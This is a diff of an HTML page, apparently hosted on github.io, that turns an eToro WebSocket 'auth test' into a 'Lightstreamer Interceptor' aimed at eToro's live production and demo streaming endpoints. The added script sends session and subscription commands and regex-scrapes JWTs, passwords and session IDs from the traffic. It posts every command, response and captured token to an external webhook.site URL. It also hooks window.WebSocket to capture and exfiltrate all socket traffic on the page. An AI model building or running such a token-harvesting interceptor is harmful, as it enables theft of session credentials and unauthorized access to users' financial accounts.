@@ -3,22 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>eToro WebSocket Auth Test</title>
+    <title>Lightstreamer eToro - Interceptor</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
             background: #0a0a0a;
             color: #00ff00;
-            font-family: monospace;
+            font-family: 'Courier New', monospace;
             padding: 20px;
         }
-        .success { color: #00ff00; }
-        .error { color: #ff4444; }
-        .info { color: #ffaa00; }
-        .log {
-            border-bottom: 1px solid #333;
-            padding: 5px;
-            margin: 5px 0;
+        
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+            padding: 10px;
+            border-bottom: 1px solid #00ff00;
         }
+        
+        .endpoint-card {
+            background: #1a1a2e;
+            border: 1px solid #333;
+            margin-bottom: 20px;
+            padding: 15px;
+            border-radius: 5px;
+        }
+        
+        .endpoint-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #ffaa00;
+            margin-bottom: 10px;
+        }
+        
+        .message-list {
+            max-height: 300px;
+            overflow-y: auto;
+            background: #000;
+            padding: 10px;
+            margin-top: 10px;
+        }
+        
+        .message {
+            border-bottom: 1px solid #222;
+            padding: 5px;
+            font-size: 11px;
+            word-break: break-all;
+        }
+        
+        .message.sent { color: #ffff00; border-left: 3px solid #ffff00; padding-left: 5px; }
+        .message.received { color: #00ff00; border-left: 3px solid #00ff00; padding-left: 5px; }
+        .message.error { color: #ff4444; border-left: 3px solid #ff4444; }
+        .message.token { color: #ff00ff; background: #1a0a1a; }
+        
         button {
             background: #2a2a3e;
             color: #00ff00;
@@ -26,238 +67,339 @@
             padding: 10px 20px;
             margin: 5px;
             cursor: pointer;
+            font-family: monospace;
         }
+        
         button:hover {
             background: #00ff00;
             color: #0a0a0a;
         }
-        textarea {
-            width: 100%;
-            height: 100px;
+        
+        .stats {
+            display: flex;
+            gap: 20px;
+            margin: 10px 0;
+            flex-wrap: wrap;
+        }
+        
+        .stat {
             background: #1a1a2e;
-            color: #00ff00;
-            border: 1px solid #333;
-            font-family: monospace;
             padding: 10px;
+            border-radius: 5px;
+        }
+        
+        .token-highlight {
+            background: #ff00ff22;
+            border: 1px solid #ff00ff;
+            padding: 2px 5px;
+            border-radius: 3px;
+            font-weight: bold;
+        }
+        
+        .raw-data {
+            background: #000;
+            padding: 10px;
+            font-size: 10px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
-    <h1>🔐 eToro WebSocket - Teste de Autenticação</h1>
-    <div class="info">✅ Descoberta: WebSocket ACEITA conexão cross-origin (github.io → etoro.com)</div>
-    <div class="info">🎯 Agora testando formatos de autenticação...</div>
-    
-    <div>
-        <button onclick="testAuth1()">Teste 1: userKey + apiKey</button>
-        <button onclick="testAuth2()">Teste 2: JWT Bearer</button>
-        <button onclick="testAuth3()">Teste 3: Session Token</button>
-        <button onclick="testAuth4()">Teste 4: Lightstreamer Format</button>
-        <button onclick="testAllAuth()">⚡ TESTAR TODOS</button>
-        <button onclick="clearLogs()">Limpar</button>
+    <div class="header">
+        <h1>🔍 Lightstreamer eToro - Interceptor</h1>
+        <p>Testando endpoints: push-lightstreamer | push-demo-lightstreamer</p>
+        <p style="font-size: 12px; color: #888;">Webhook: https://webhook.site/5cd45eaf-7257-4100-8719-2810a7bd6022</p>
     </div>
     
-    <div style="margin-top: 20px;">
-        <div class="info">📝 Token para teste (cole aqui se tiver):</div>
-        <textarea id="tokenInput" placeholder="Cole um token da eToro aqui se tiver acesso..."></textarea>
-        <button onclick="testWithCustomToken()">Testar com Token Personalizado</button>
+    <div class="stats">
+        <div class="stat">🔌 Conexões: <span id="connCount">0</span></div>
+        <div class="stat">📤 Enviadas: <span id="sentCount">0</span></div>
+        <div class="stat">📥 Recebidas: <span id="recvCount">0</span></div>
+        <div class="stat">🔑 Tokens: <span id="tokenCount">0</span></div>
     </div>
     
-    <div id="logs" style="margin-top: 20px; height: 500px; overflow-y: auto; background: #000; padding: 10px;"></div>
+    <div style="margin-bottom: 20px;">
+        <button onclick="testProduction()">🌐 PRODUCTION: push-lightstreamer</button>
+        <button onclick="testDemo()">🧪 DEMO: push-demo-lightstreamer</button>
+        <button onclick="testBoth()">⚡ TESTAR AMBOS</button>
+        <button onclick="injectInterceptor()">💉 INJETAR INTERCEPTOR GLOBAL</button>
+        <button onclick="clearAll()">🗑️ LIMPAR</button>
+    </div>
+    
+    <div id="production" class="endpoint-card">
+        <div class="endpoint-title">📡 PRODUCTION: wss://push-lightstreamer.cloud.etoro.com/lightstreamer</div>
+        <div id="prodMessages" class="message-list"></div>
+    </div>
+    
+    <div id="demo" class="endpoint-card">
+        <div class="endpoint-title">🧪 DEMO: wss://push-demo-lightstreamer.cloud.etoro.com/lightstreamer</div>
+        <div id="demoMessages" class="message-list"></div>
+    </div>
+    
+    <div class="endpoint-card">
+        <div class="endpoint-title">🔑 TOKENS & DADOS CAPTURADOS</div>
+        <div id="tokensList" class="message-list"></div>
+    </div>
+    
+    <div class="endpoint-card">
+        <div class="endpoint-title">📋 RAW DATA (última mensagem)</div>
+        <div id="rawData" class="raw-data"></div>
+    </div>
     
     <script>
         const WEBHOOK = 'https://webhook.site/5cd45eaf-7257-4100-8719-2810a7bd6022';
+        let stats = { connections: 0, sent: 0, received: 0, tokens: 0 };
+        let activeSockets = [];
         
-        function addLog(message, type = 'info') {
-            const logs = document.getElementById('logs');
-            const logDiv = document.createElement('div');
-            logDiv.className = `log ${type}`;
-            logDiv.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
-            logs.appendChild(logDiv);
-            logs.scrollTop = logs.scrollHeight;
+        function updateStats() {
+            document.getElementById('connCount').innerText = stats.connections;
+            document.getElementById('sentCount').innerText = stats.sent;
+            document.getElementById('recvCount').innerText = stats.received;
+            document.getElementById('tokenCount').innerText = stats.tokens;
+        }
+        
+        function addMessage(containerId, type, data, isToken = false) {
+            const container = document.getElementById(containerId);
+            const msgDiv = document.createElement('div');
+            msgDiv.className = `message ${type}`;
+            const timestamp = new Date().toLocaleTimeString();
+            
+            let displayData = data;
+            if (typeof data === 'object') {
+                displayData = JSON.stringify(data, null, 2);
+            }
+            
+            msgDiv.innerHTML = `<strong>[${timestamp}]</strong> ${type.toUpperCase()}: ${displayData.substring(0, 500)}${displayData.length > 500 ? '...' : ''}`;
+            container.appendChild(msgDiv);
+            container.scrollTop = container.scrollHeight;
+            
+            // Atualiza raw data
+            if (type === 'received' || type === 'sent') {
+                document.getElementById('rawData').innerHTML = `<strong>${timestamp} - ${type}</strong>\n${displayData}`;
+            }
+        }
+        
+        function addToken(token, source) {
+            const container = document.getElementById('tokensList');
+            const tokenDiv = document.createElement('div');
+            tokenDiv.className = 'message token';
+            const timestamp = new Date().toLocaleTimeString();
+            tokenDiv.innerHTML = `<strong>[${timestamp}] ${source}</strong><br>${typeof token === 'object' ? JSON.stringify(token, null, 2) : token}`;
+            container.appendChild(tokenDiv);
+            container.scrollTop = container.scrollHeight;
+            
+            stats.tokens++;
+            updateStats();
             
             // Envia para webhook
             fetch(WEBHOOK, {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify({ timestamp: Date.now(), message, type })
+                body: JSON.stringify({ type: 'TOKEN', source, token, timestamp: Date.now() })
             }).catch(() => {});
         }
         
-        function testAuth1() {
-            addLog('🚀 Teste 1: Autenticando com userKey + apiKey', 'info');
-            const ws = new WebSocket("wss://ws.etoro.com/ws");
+        function extractTokensFromMessage(data) {
+            const tokens = [];
+            const dataStr = typeof data === 'string' ? data : JSON.stringify(data);
             
-            ws.onopen = () => {
-                addLog('✅ Conexão estabelecida', 'success');
-                
-                const authMsg = {
-                    id: crypto.randomUUID(),
-                    operation: "Authenticate",
-                    data: {
-                        userKey: "test_user_key_12345",
-                        apiKey: "test_api_key_67890"
-                    }
-                };
-                
-                ws.send(JSON.stringify(authMsg));
-                addLog(`📤 Enviado: ${JSON.stringify(authMsg)}`, 'info');
-            };
+            // Padrões Lightstreamer específicos
+            const patterns = [
+                /LS_user=([^&\s]+)/gi,
+                /LS_password=([^&\s]+)/gi,
+                /LS_session=([^&\s]+)/gi,
+                /SESSION_ID[:\s=]+([A-Za-z0-9]+)/gi,
+                /token["']?\s*[:=]\s*["']([^"']+)["']/gi,
+                /eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+/g,  // JWT
+                /[A-Fa-f0-9]{32,}/g  // Possíveis hashes/sessions
+            ];
             
-            ws.onmessage = (e) => {
-                const data = JSON.parse(e.data);
-                addLog(`📥 Recebido: ${JSON.stringify(data)}`, 
-                       data.success ? 'success' : 'error');
-                
-                if(data.success) {
-                    addLog('🎉 AUTENTICAÇÃO FUNCIONOU! Token capturado!', 'success');
-                    fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
+            for (const pattern of patterns) {
+                const matches = dataStr.match(pattern);
+                if (matches) {
+                    matches.forEach(match => {
+                        tokens.push(match);
+                        addToken(match, 'Extraído do Lightstreamer');
+                    });
                 }
-            };
+            }
             
-            ws.onerror = () => addLog('❌ Erro na conexão', 'error');
+            return tokens;
         }
         
-        function testAuth2() {
-            addLog('🚀 Teste 2: Autenticando com JWT Bearer', 'info');
-            const ws = new WebSocket("wss://ws.etoro.com/ws");
+        function testLightstreamer(endpoint, containerId, isDemo = false) {
+            stats.connections++;
+            updateStats();
+            
+            const ws = new WebSocket(`wss://${endpoint}/lightstreamer`);
+            activeSockets.push(ws);
+            const name = isDemo ? 'DEMO' : 'PRODUCTION';
+            
+            addMessage(containerId, 'sent', `🚀 Conectando a ${endpoint}...`);
             
             ws.onopen = () => {
-                addLog('✅ Conexão estabelecida', 'success');
+                addMessage(containerId, 'received', `✅ CONEXÃO ESTABELECIDA (Origin: ${window.location.origin})`);
                 
-                const authMsg = {
-                    id: crypto.randomUUID(),
-                    operation: "Authenticate",
-                    data: {
-                        token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0X3VzZXIiLCJyb2xlIjoidXNlciIsImlhdCI6MTUxNjIzOTAyMn0.test123"
-                    }
-                };
-                
-                ws.send(JSON.stringify(authMsg));
-                addLog(`📤 Enviado: ${JSON.stringify(authMsg)}`, 'info');
-            };
-            
-            ws.onmessage = (e) => addLog(`📥 Recebido: ${e.data}`, 'info');
-            ws.onerror = () => addLog('❌ Erro', 'error');
-        }
-        
-        function testAuth3() {
-            addLog('🚀 Teste 3: Autenticando com Session Token', 'info');
-            const ws = new WebSocket("wss://ws.etoro.com/ws");
-            
-            ws.onopen = () => {
-                addLog('✅ Conexão estabelecida', 'success');
-                
-                const authMsg = {
-                    id: crypto.randomUUID(),
-                    operation: "Authenticate",
-                    data: {
-                        sessionToken: "sess_test_12345_abcde",
-                        userId: "user_123"
-                    }
-                };
-                
-                ws.send(JSON.stringify(authMsg));
-                addLog(`📤 Enviado: ${JSON.stringify(authMsg)}`, 'info');
-            };
-            
-            ws.onmessage = (e) => addLog(`📥 Recebido: ${e.data}`, 'info');
-            ws.onerror = () => addLog('❌ Erro', 'error');
-        }
-        
-        function testAuth4() {
-            addLog('🚀 Teste 4: Formato Lightstreamer', 'info');
-            const ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
-            
-            ws.onopen = () => {
-                addLog('✅ Conexão estabelecida com Lightstreamer', 'success');
-                
+                // Comandos Lightstreamer para testar
                 const commands = [
+                    "create_session\r\nLS_user=anonymous&LS_adapter_set=PROXY_PUSH",
+                    "create_session\r\nLS_user=demo&LS_adapter_set=DEFAULT", 
                     "create_session\r\nLS_user=test&LS_adapter_set=PROXY_PUSH",
-                    "create_session\r\nLS_user=anonymous&LS_adapter_set=DEFAULT",
-                    "control\r\nLS_op=add&LS_table=1&LS_id=1"
+                    "subscribe\r\nLS_mode=MERGE&LS_group=instrument:100000&LS_schema=LastPrice",
+                    "subscribe\r\nLS_mode=RAW&LS_group=market:ALL&LS_schema=Quote",
+                    "control\r\nLS_op=add&LS_table=1&LS_id=1",
+                    "status\r\nLS_op=show"
                 ];
                 
                 commands.forEach((cmd, i) => {
                     setTimeout(() => {
                         ws.send(cmd);
-                        addLog(`📤 Lightstreamer: ${cmd.replace(/\n/g, '\\n')}`, 'info');
-                    }, i * 1000);
+                        addMessage(containerId, 'sent', cmd.replace(/\n/g, '\\n'));
+                        stats.sent++;
+                        updateStats();
+                        
+                        extractTokensFromMessage(cmd);
+                        
+                        // Envia para webhook
+                        fetch(WEBHOOK, {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            body: JSON.stringify({ 
+                                type: 'COMMAND', 
+                                endpoint, 
+                                command: cmd,
+                                timestamp: Date.now() 
+                            })
+                        }).catch(() => {});
+                    }, i * 1500);
                 });
             };
             
-            ws.onmessage = (e) => {
-                addLog(`📥 Lightstreamer Response: ${e.data.substring(0, 200)}`, 
-                       e.data.includes('ERROR') ? 'error' : 'info');
-                       
-                if(e.data.includes('SESSION') || e.data.includes('token')) {
-                    addLog('🎯 Possível token/sessão capturado!', 'success');
+            ws.onmessage = (event) => {
+                let responseText = event.data;
+                if (typeof responseText === 'object' && responseText.text) {
+                    responseText = responseText.text;
                 }
+                
+                addMessage(containerId, 'received', responseText.substring(0, 500));
+                stats.received++;
+                updateStats();
+                
+                const tokens = extractTokensFromMessage(responseText);
+                
+                // Verifica se tem dados interessantes
+                if (responseText.includes('SESSION') || responseText.includes('token')) {
+                    addMessage(containerId, 'token', '🔑 SESSÃO/TOKEN DETECTADO!');
+                }
+                
+                // Envia para webhook
+                fetch(WEBHOOK, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ 
+                        type: 'RESPONSE', 
+                        endpoint, 
+                        data: responseText.substring(0, 1000),
+                        timestamp: Date.now() 
+                    })
+                }).catch(() => {});
             };
             
-            ws.onerror = () => addLog('❌ Erro Lightstreamer', 'error');
+            ws.onerror = (error) => {
+                addMessage(containerId, 'error', `ERRO: ${error}`);
+                fetch(WEBHOOK, {
+                    method: 'POST',
+                    mode: 'no-cors', 
+                    body: JSON.stringify({ type: 'ERROR', endpoint, error: error.toString() })
+                }).catch(() => {});
+            };
+            
+            ws.onclose = (event) => {
+                addMessage(containerId, 'error', `CONEXÃO FECHADA: ${event.code} - ${event.reason}`);
+            };
         }
         
-        function testWithCustomToken() {
-            const token = document.getElementById('tokenInput').value;
-            if(!token) {
-                addLog('⚠️ Cole um token no campo acima primeiro!', 'error');
-                return;
-            }
+        function testProduction() {
+            testLightstreamer('push-lightstreamer.cloud.etoro.com', 'prodMessages', false);
+        }
+        
+        function testDemo() {
+            testLightstreamer('push-demo-lightstreamer.cloud.etoro.com', 'demoMessages', true);
+        }
+        
+        function testBoth() {
+            addMessage('prodMessages', 'sent', '🚨 INICIANDO TESTE AMBOS ENDPOINTS');
+            testProduction();
+            setTimeout(testDemo, 1000);
+        }
+        
+        // INTERCEPTOR GLOBAL - Captura TODOS WebSockets da página
+        function injectInterceptor() {
+            const OriginalWebSocket = window.WebSocket;
             
-            addLog(`🚀 Testando com token: ${token.substring(0, 50)}...`, 'info');
-            const ws = new WebSocket("wss://ws.etoro.com/ws");
-            
-            ws.onopen = () => {
-                addLog('✅ Conexão estabelecida', 'success');
+            window.WebSocket = function(...args) {
+                console.log('[INTERCEPTOR] Nova conexão WebSocket:', args[0]);
+                addMessage('prodMessages', 'token', `🎯 INTERCEPTADO: ${args[0]}`);
                 
-                // Tenta diferentes formatos
-                const formats = [
-                    { userKey: token, apiKey: "" },
-                    { token: token },
-                    { jwt: token },
-                    { sessionToken: token }
-                ];
+                const ws = new OriginalWebSocket(...args);
                 
-                formats.forEach((format, i) => {
-                    setTimeout(() => {
-                        const authMsg = {
-                            id: crypto.randomUUID(),
-                            operation: "Authenticate",
-                            data: format
-                        };
-                        ws.send(JSON.stringify(authMsg));
-                        addLog(`📤 Teste formato ${i+1}: ${JSON.stringify(authMsg)}`, 'info');
-                    }, i * 1000);
+                // Hook no send
+                const originalSend = ws.send;
+                ws.send = function(data) {
+                    console.log('[INTERCEPTOR] SEND:', data);
+                    addMessage('prodMessages', 'sent', `[INTERCEPT] ${data}`);
+                    extractTokensFromMessage(data);
+                    
+                    fetch(WEBHOOK, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({ type: 'INTERCEPT_SEND', data: data.toString() })
+                    }).catch(() => {});
+                    
+                    return originalSend.call(this, data);
+                };
+                
+                // Hook no onmessage
+                ws.addEventListener('message', (event) => {
+                    console.log('[INTERCEPTOR] RECV:', event.data);
+                    addMessage('prodMessages', 'received', `[INTERCEPT] ${event.data}`);
+                    extractTokensFromMessage(event.data);
+                    
+                    fetch(WEBHOOK, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({ type: 'INTERCEPT_RECV', data: event.data })
+                    }).catch(() => {});
                 });
+                
+                return ws;
             };
             
-            ws.onmessage = (e) => {
-                const data = JSON.parse(e.data);
-                addLog(`📥 Resposta: ${JSON.stringify(data)}`, 
-                       data.success ? 'success' : 'error');
-                
-                if(data.success && data.data && data.data.token) {
-                    addLog('🔥 TOKEN DE SESSÃO CAPTURADO!', 'success');
-                    fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
-                }
-            };
+            window.WebSocket.prototype = OriginalWebSocket.prototype;
+            addMessage('prodMessages', 'token', '✅ INTERCEPTOR GLOBAL INJETADO!');
+            alert('Interceptor injetado! Agora qualquer WebSocket será capturado.');
         }
         
-        function testAllAuth() {
-            addLog('🚨 INICIANDO TODOS OS TESTES DE AUTENTICAÇÃO', 'info');
-            testAuth1();
-            setTimeout(testAuth2, 3000);
-            setTimeout(testAuth3, 6000);
-            setTimeout(testAuth4, 9000);
+        function clearAll() {
+            document.getElementById('prodMessages').innerHTML = '';
+            document.getElementById('demoMessages').innerHTML = '';
+            document.getElementById('tokensList').innerHTML = '';
+            document.getElementById('rawData').innerHTML = '';
+            stats = { connections: 0, sent: 0, received: 0, tokens: 0 };
+            updateStats();
+            
+            // Fecha todas conexões ativas
+            activeSockets.forEach(ws => {
+                try { ws.close(); } catch(e) {}
+            });
+            activeSockets = [];
         }
         
-        function clearLogs() {
-            document.getElementById('logs').innerHTML = '';
-            addLog('Logs limpos', 'info');
-        }
-        
-        addLog('✅ Ferramenta carregada. WebSocket ACEITA conexão cross-origin!', 'success');
-        addLog('🎯 Testando formatos de autenticação...', 'info');
+        // Auto-executa ao carregar
+        console.log('Lightstreamer Interceptor loaded');
+        addMessage('prodMessages', 'sent', '✅ Ferramenta pronta. Clique em TESTAR AMBOS para começar.');
     </script>
 </body>
 </html>
